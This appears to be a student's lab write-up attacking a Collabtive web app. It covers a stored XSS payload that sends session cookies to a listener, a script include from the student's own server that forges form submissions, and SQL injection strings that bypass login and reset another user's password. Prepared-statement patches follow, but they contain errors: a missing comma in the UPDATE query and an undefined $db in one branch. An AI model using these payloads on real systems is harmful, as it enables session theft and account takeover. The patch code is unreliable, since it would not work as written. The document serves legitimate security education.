@@ -1,0 +1,157 @@
+Daniel Vinakovsky
+
+#1.1)
+	I started netcat with the following: "nc -l 9876". I then crafted the
+	following line to force the browser to attempt to load an image from the
+	URL http://127.0.0.1:9876/index?c='+escape(document.cookie). This, in turn,
+	results in a theft of the currently logged in user's PHPSESSID (an attacker
+	would be able to see the request with the user's session cookie).
+	The code referred to above (saved in the "company" field):
+	<script>document.write('<img src=http://127.0.0.1:9876/index?c='+
+	escape(document.cookie)+'>');</script>
+	Note: Smart quotes in Windows are horribly annoying when trying to debug
+	why your JavaScript doesn't work.
+
+#1.2)
+	In order to sucessfully implement this attack, I needed to learn some 
+	JavaScript and analyze page-specific headers using LiveHTTPHeaders. 
+	Starting from the provided example, I slowly built up a function
+	that, given a PHPSESSID cookie, creates a POST request that should end up
+	creating a new project for that user. I noticed that there was a problem
+	with this, and that a second GET request needed to be made to the location
+	provided by the response's "Location" header.
+	
+#2)
+	I) Rather than needing to collect the PHPSESSID manually, I wrote a new
+	JS function that simply obtains the current document.cookie (PHPSESSID).
+	However, there turned out to be far more to it as the hints may suggest.
+	I adapted the provided Ajax.PeriodicalUpdater to only run once per page
+	load, and created a callback for it. The callback sanitizes the response
+	from "manageuser.php?action=onlinelist", and obtains the username and id
+	of the current user. It uses this data to submit a form on a user's behalf
+	with the requested change to the URL.
+	
+	II) This time, I updated the code described above to add a JavaScript 
+	"include" to the "company" field:
+	<script type='text/javascript' 
+		src='http://dev.gnurds.com/cs577lab6/xwrm.js'>
+	</script>
+	For ease of implementation, I stored the actual script on my personal VPS.
+	
+
+#3.1)
+	I made the edits described.
+
+#3.2)
+	a) Yes, you can. For example, you can enter this string in the login
+	field: admin'); -- 
+	
+	The idea is that it changes the string:
+	SELECT ID, name, locale, lastlogin, gender,
+	FROM USERS_TABLE
+	WHERE (name = '$user' OR email = '$user') AND pass = '$pass'");
+	
+	to look like:
+	SELECT ID, name, locale, lastlogin, gender,
+	FROM USERS_TABLE
+	WHERE (name = 'admin'); --  OR email = ’$user’) AND pass = ’$pass’");
+	Everything past the " -- " sequence becomes a comment, allowing us
+	to bypass the need to have a valid password.
+	
+	b) No. PHP does not allow having multiple queries in a single
+	call to the mysql_query() function. There is also no way to change data
+	in the body of a SQL SELECT statement.
+	http://www.sqlinjection.net/stacked-queries/
+	
+#3.3)
+	I found the SQLi vulnerability in the company field by inspecting the 
+	source code in "class.user.php". Looking at the function responsible
+	for changing the password, I noted that passwords were trivially hashed
+	using SHA1 and subsequently stored in the database. After several attempts
+	and rounds of debugging (including realizing I was on the wrong page, as 
+	well as realizing that I needed to change the submitted username to "bob") 
+	I was finally able to successfully inject the following string in order to
+	change Bob's password from Alice's account:
+	
+HaxRUS', `pass`= 'f3f3005e279317b9f571192102bf407d83dbd7b2' WHERE ID = 4; --  # 
+
+	I confirmed that I was then able to login using the password "cs577" for
+	which this string is a valid preimage for the SHA1 hash above.
+	
+#3.4)
+	
+	I) After looking through "class.user.php", I patched (read: uncommented fixes 
+	for) the vulnerable functions login($user,$pass) and edit(...) by wrapping 
+	each variable (except password, which gets hashed) with calls to 
+	mysql_real_escape_string($var).
+	
+	II) After finding the DB creds using grep, I created prepare statements 
+	similar to the provided example:
+	
+	function login($user,$pass)
+	{
+	$pass = sha1($pass);
+	$db   = new mysqli("localhost", "root", "seedubuntu", "sql_collabtive_db");
+	$stmt = $db->prepare("SELECT ID,name,locale,lastlogin,gender FROM user
+                         WHERE (name=? OR email=?) AND pass=?");
+    $stmt->bind_param("sss", $user, $user, $pass);
+    $stmt->execute();
+    $stmt->bind_result($bind_ID, $bind_name, $bind_locale, $bind_lastlogin,
+                       $bind_gender);
+    $chk = $stmt->fetch();
+	if ($bind_ID != "")
+	{
+		...
+		return true;
+	}
+	else
+		return false;
+	...
+	}
+	
+	edit(...) was more annoying due to all of the variables, but the same idea:
+	
+	function edit(...)
+	{
+    $rate = (double) $rate;
+    $id = (int) $id;
+
+    if ($avatar != "")
+    {
+		$db   = new mysqli("localhost", "root", "seedubuntu", 
+							"sql_collabtive_db");
+        $stmt = $db->prepare("UPDATE user SET name=?, email=?, tel1=?,
+							 tel2=?, company=?, zip=?, gender=?, url=?,
+							 adress=?, adress2=?, state=?, country=?,
+							 tags=?, locale=?, avatar=? rate=?
+							 WHERE ID = ?");
+		$stmt->bind_param("sssssssssssssssdi", $name, $email, $tel1, $tel2,
+						   $company, $zip, $gender, $url, $address1,
+						   $address2, $state, $country, $tags, $locale,
+						   $avatar, $rate, $id);
+		$upd = $stmt->execute();
+        }
+    else
+        {
+        $stmt = $db->prepare("UPDATE user SET name=?, email=?, tel1=?,
+                             tel2=?, company=?, zip=?, gender=?, url=?,
+                             adress=?, adress2=?, state=?, country=?,
+                             tags=?, locale=?, rate=? WHERE ID = ?");
+        $stmt->bind_param("ssssssssssssssdi", $name, $email, $tel1, $tel2,
+                           $company, $zip, $gender, $url, $address1,
+                           $address2, $state, $country, $tags, $locale,
+                           $rate, $id);
+        $upd = $stmt->execute();
+        }
+    if ($upd)
+        {
+            $this->mylog->add($name, 'user', 2, 0);
+            return true;
+        }
+    else
+        return false;
+	}
+	
+	
+	
+	
